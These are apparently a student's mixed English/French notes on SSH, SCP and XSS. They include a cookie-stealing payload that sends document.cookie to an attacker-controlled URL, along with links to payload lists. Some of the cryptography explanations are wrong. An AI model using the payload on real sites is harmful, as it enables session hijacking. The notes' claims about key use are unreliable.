  * **Confidentiality** : The message is encrypted and sent publicly, with anyone being able to catch it, hear it, having access to it and being able to read it, but no one except the intended recipient is able to decipher it.
  * **Integrity** : The message recieved _is ideed_ (exactly) the one sent. No transmission errors, or channel attacks, can happen.
- SSH provides ability to communicate to distant machines (often servers) in a totally secure and encrypted manner.
- SSH relies on the **asymmetric encrypting** principle. This principle is described as follows :
  * Alice and Bob want to communicate. Alice has a private-key public-key pair (and so does Bob, if Bob wants to communicate back).
  * When sending a message to Bob, Alice encrypts it using her private key.
  * Then, Bob can decypher it using **Alice's public key**
- Hash maps are created such that : 
  * Only the person who has the private key can encrypt a message that can be decoded using their public key.
  * Consequently, since the private key is kept private (and only if the private key was able to be kept private), if Bob is able to decrypt a message using Alice's public key, then he can be certain that it is indeed Alice who encrypted it : in other words, that the message was indeed sent by Alice.
  * Note : Mathematicallt, the private and public keys play symmetric roles. It could theoretically be possible to swap them. The fact that the private key is kept private is what breaks the symmetry, in terms of usage : the fact that the private key is kept private ensures **Authenticity**.
- This way, SSH ensures **authenticity** of encrypted data. 
- Confidentiality and Integrity are implemented simultaneously, and (simultaneously) also ensured by SSH.
- SSH uses TCP port 22.
- If (on WSL for instance) ssh tells you that it doesn't have the permissions ti use the key (or thinks you're not the real owner), use ``chmod 600 ~/.ssh/privatekay`` (and ``chmod 600 ~/.ssh/publickey``, tant qu'on y est) to open the permissions.
- SSH uses an _SSH Agent_ to find the keys

### SSH usage

- ``ssh -i "~/.ssh/privatekey_filename" user@[IPv4 or IPv6 address, or domain name]``
- ``ssh -i "~/.ssh/privatekey" user@hostname -J -i "~/.ssh/privatekey" user@ssh-bridge``
( u)
- Note : if something doesn't work, check that you have specified a private key (and that it's the right one)
- When using an SSH bridge, both what is sent by you to the ssh bridge _and_ what is sent by the ssh bridge to the desired distant host are encrypted with your private key. Actually, the private keys can be configured to be different (just set different keys in the command), but the ssh bridge will not use any key located on their storage. You must specify (and give) both keys.
- The **authorized_keys** file : 
  * It is located in ``~/.ssh/``, on the appropriate user (there is one per user, it will correspond to the user you connect to when you use ``user@host``)
  * It lists all public keys that are allowed to connect to the server (to the host (machine) and user concerned).
  * You typically have to contact the server administrator for him to add your public key in this file for you to be able to connect.
- The **known_host** file : 
  * It is located in ``~/.ssh/``, but (typically) on _your_ machine.
  * It lists _public-key_-_ip address_ pairs, to avoid man-in-the-middle attacks (in the form of hashs computed using the SHA256 (or another) hash map)
  * When a machine connects to an IP address for the first time, the terminal (OpenSSH) tells something like : "Are you sure you want to connect to this host ? Here is (a hash of) the remote host's public key". The idea is that you should then contact the server administrator to make sure this fingerprint is actually the one of the server you want to connect to : to avoid a man-in-the-middle attack, i.e. to avoid connecting to the wrong remote host. 
  * In practice, no one does that. We just type "yes". 
  * The _public-key_-_ip address_ pair (a hash of it, actually) is then stored in the ``known_host`` file. (It adds one line to the file, the fact that they are paired is made by the fact that they are on the same line). 
  * Your machine then knows that this remote host is trustworthy and it won't ask this a second time.

### SSH Config files

- An SSH config allow to win time by pre-configuring some SSH parameter to connect to distant servers quicker without having to write the same command over and over again.
- An SSH config must be written in a (text) file, either :
  * named ``config`` and located in ``~/.ssh/``
  * or named ``ssh_config`` and located in ``/etc/ssh/ssh_config`` (on Linux)
- Example :
```
Host ssh.enst.fr
  Hostname ssh.enst.fr
  User driot-23
  IdentityFile ~/.ssh/ed

Host bulledev
  Hostname bulle-ssh.rezel.net
  User dev
  IdentityFile ~/.ssh/ed
  ProxyCommand ssh -W %h:%p ssh.enst.fr

Host bulle
  Hostname bulle-ssh.rezel.net
  User root
  IdentityFile ~/.ssh/ed
  ProxyCommand ssh -W %h:%p ssh.enst.fr

Host pace
  Hostname 137.194.13.180
  User root
  IdentityFile ~/.ssh/ed
```
- Uppercase first letters are mandatory.
- ``Hostname``, ``User``, ``IdentityFile`` are self-explanatory...
- ``ProxyCommand`` specifies the command to use to connect to the server. (...)
  * The command string extends to the end of the line, and is executed using the user's shell ‘exec’ directive to avoid a lingering shell process. (...)
  * ``ProxyCommand ssh -W %h:%p ssh.enst.fr`` can be used to automate the connection to a SSH bridge. (What does -W do though ?)(...)
- ProxyJump too, but easier. 
  * ``ProxyJump user@host:port``
- ``ProxyCommand`` and ``ProxyJump`` accept [TOKENS](https://man.openbsd.org/ssh_config#TOKENS) :
  * ``%h`` : will be replaced by the Host
  * ``%n`` : will be replaced by the original remote hostname, as given on the command line.
  * ``%p`` : will be replaced by the remote Port.
  * ``%r`` : will be replaced by the remote Username.
  * ``%%`` : will be replaced by ``%``
  * ProxyCommand and ProxyJump do not accept any other [TOKENS  described by the Documentation](https://man.openbsd.org/ssh_config#TOKENS)
  * There exists other tokens.
- **Documentation** : 
  * https://man.openbsd.org/ssh_config
  * https://man.openbsd.org/ssh_config#ProxyCommand

### SCP

- Usage : 
  * ``scp -i "path/to/key" user@[IP Address]`` (Brackets are optional)
  * ``scp -i "path/to/key" [filename | path/to/filename] user@[IP Address]:desired/path/to/file`` (First brackets are unnecessary (maybe even command-breaking), second brackets are mandatory)(Also, it is possible to change the filename in the process : ``desired/path/to/newfilename.fileextension``. In other words, ``file`` can be different from the original filename (the new file created will then have this name). Specifying no file name (that is, ``desired/path/to/file/``, with the path **ending in a ``/``**) will keep the file name)
  * **To copy (whole) directories** : ``scp (-i ...) -r foolder/* root@pace-lxc.rezel.net:~/``. The ``*`` wildcard is optional.
- SHA256 (et SHA512, SHA1, ...) sont des fonctions de hashage.
- **authorized_keys** : C'est le fichier, situé dans ``~/.ssh/`` d'un serveur, qui dit les clés publiques qui sont autorisées à se connecter à un certain user. 
  * Un client peut se connecter à un serveur en SSH au user ``utilisateur`` si (et seulement si) sa clé publique se situe dans le ``authorized_keys`` de l'utilisateur, autrement dit dans le fichier ``/home/utilisateur/.ssh/authorized_keys``. 

## Cybersecurity

### Metadatas

- ``meta2go``, ``exiftool``, ``aperisolve``, ... Are tools that are able to extract metadatas.
- ``www.dcode.fr`` propose un détecteur de code, qui tente de trouver le code qui a choffré un truc. 

### Cross-site scripting (XSS)

- XSS Means cross-site scripting. Yes, the acronym does not work...
- The goal of a XSS breach is to get the cookies of an administrator of a web page. This is done by getting a cookie, which acts like an access token.
- Example : When typing "Foobar" in a the Google seach engine, the word "Foobar" appears in the web page source code. More generally : if there is an input on the page that reads text, and if it turns out that this code gets written directly on the HTML, you can inject stuff on the HTML... JavaScript ``<script></script>`` tags for instance, that can run code !
- Context is the crucial point : The text could be inserted as raw HTML code, inside HTML tags attribute, or inside JavaScript code.
- To detect XSS : List all user inputs, and try to see them being reused (reflected, written directly) on the page 
- To exploit an XSS breach : 
  * You would, typically, insert the following JavaScript Code : ``document.location.replace(CONTROLLED_URL+document.cookie)``
  * This code will, when executed in a browser, replace the cuurent URL the browser is into by the URL ``CONTROLLED_URL+document.cookie``.
  * Here, ``CONTROLLED_URL`` is an URL you control, i.e. that you can choose.
  * Typically, you would use a website like ``Pipedream`` or **``Requestcatcher``** (Requestcatcher is better) that gives you an URL (which you (partially) choose, like ``hiimsteve.requestcatcher.com`` and prints you the requests that are sent to that URL. 
  * Adding ``document.cookie`` adds the cookies of the person that get trapped in the XSS breach !
- Reflected XSS
  * In this case, the malicious code is executed locally on the admin's machine.
  * The attacker sends to the admin a webpage with a malicous payload. Typically, what we mean by payload is URL of the form ``www.website.com/.../[URL encoded payload]`` : that is, adding a payload means adding something to the URL. 
  * The admin must then click on the link. This is basically fishing : the admin must click on the link...
  * The admin will then visit (his own !) web page, connected with his account. His (own !) server will respond ot him (with his admin cookie).
  * The malicious payload will then be executed (on his own machine), and will send his cookie to the attacker.
- Stocked XSS
  * In this case, the malicious code is stocked on the distant server. Hence, all users that will load the page will be victims of the attacker !!
  * This is done by injecting code on the website ; this requires the website to allow this. Typically, this happens on a forum, on which people can post text ; or comments (like on YouTube), ...
  * Any people visiting the website will then request the webpage. The malicious is executed on their machine, and send the informations (cookies...) to the attacher.
- For payloads, code to be injected, there are many ressources online that list possible payloads and stuff :
  * [Hacktricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
  * [XSS Cheatsheets](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
  * Payloads on git
    + https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt
    + https://github.com/payloadbox/xss-payload-list 
  * Searching a little bit often gets you what you need
- Protection against XSS
  * The most powerful one : Encoding data
  * That is, replacing ``<`` by ``&lt;`` and ``>`` by ``&gt;``. This works well because data ecryption in HTML was done precisely to prevent XSS vulnerabilities.
  * Filtering data : If a user writes ``<script>`` in a text form... He is likely fouting himself of your gueule : prevent them from writing stuff like this in text boxes
  * Validation : A text box that is supposed to recieve a phone number should stop anyone from writing anything else than digits for instance ;
  * CSP : complicated, we'll see that later
- To put payload into URLs, you must use URL encoding : ``urlencoder.org``. This can also be used for URL decoding. More generally, to inject text into URLs, you must encode things into the right "URL format". Otherwise things dont work. 
- The ``eval()`` function in JavaScript is very dangerous in terms of security. Avoid it (voire : banish it).